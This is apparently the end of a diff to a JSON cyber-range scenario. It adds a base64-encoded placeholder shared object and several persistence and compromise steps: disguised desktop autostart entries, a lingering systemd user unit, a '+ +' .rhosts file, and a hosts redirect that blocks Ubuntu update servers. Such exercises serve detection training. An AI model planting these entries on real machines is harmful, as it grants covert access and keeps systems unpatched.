AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9f7/bwAAAAAAEAAAAAAAAAUAAAAAAAAAWBAAAAAAAAAGAAAAAAAAACgQAAAAAAAACgAAAAAAAAAXAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDE2LjIuMSAyMDI2MDgxOSAoUmVkIEhhdCAxNi4yLjEtMikAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAAAIAAAAAQAHAFAvAAAAAAAAAAAAAAAAAAARAAAAEQAIAAAwAAAAAAAABAAAAAAAAAAAbmNzby5jAF9EWU5BTUlDAG5pZ2h0Y2FzdF9wbGFjZWhvbGRlcgAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZWhfZnJhbWUALm5vdGUuZ251LnByb3BlcnR5AC5keW5hbWljAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAJAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAKBAAAAAAAAAoEAAAAAAAADAAAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAAFgQAAAAAAAAWBAAAAAAAAAXAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAABAAAAAgAAAAAAAABwEAAAAAAAAHAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABSAAAABwAAAAIAAAAAAAAAcBAAAAAAAABwEAAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAZQAAAAYAAAADAAAAAAAAAFAvAAAAAAAAUB8AAAAAAACwAAAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAG4AAAAIAAAAAwAAAAAAAAAAMAAAAAAAAAAgAAAAAAAACAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABzAAAAAQAAADAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAC4AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAMCAAAAAAAAB4AAAAAAAAAAsAAAAEAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAKggAAAAAAAAJwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAADPIAAAAAAAAHwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA"
+          }
+        },
+        {
+          "name": "desktop-autostart",
+          "vars": {
+            "DEST": "/home/relayadmin/.config/autostart/void-agent.desktop",
+            "EXEC": "/opt/void/void-agent",
+            "NAME": "Relay Sync Agent",
+            "OWNER": "relayadmin"
+          }
+        },
+        {
+          "name": "desktop-autostart",
+          "vars": {
+            "DEST": "/etc/xdg/autostart/void-sync.desktop",
+            "EXEC": "/opt/void/void-sync",
+            "NAME": "Relay Update Helper"
+          }
+        },
+        {
+          "name": "systemd-user-unit-persistence",
+          "vars": {
+            "USERNAME": "relaydash",
+            "UNIT_NAME": "void-user",
+            "EXEC_START": "/bin/sh -c 'sleep infinity'",
+            "DESCRIPTION": "Void user agent",
+            "LINGER": "1"
+          }
+        },
+        {
+          "name": "rhosts-trust",
+          "vars": {
+            "TARGET": "/home/relaydash/.rhosts",
+            "CONTENT": "+ +",
+            "OWNER": "relaydash"
+          }
+        },
+        {
+          "name": "hosts-redirect-linux",
+          "vars": {
+            "IP": "10.66.6.6",
+            "HOSTS": "security.ubuntu.com archive.ubuntu.com updates.vermilion.example"
+          }
+        }
+      ]
+    }
+  ]
+}
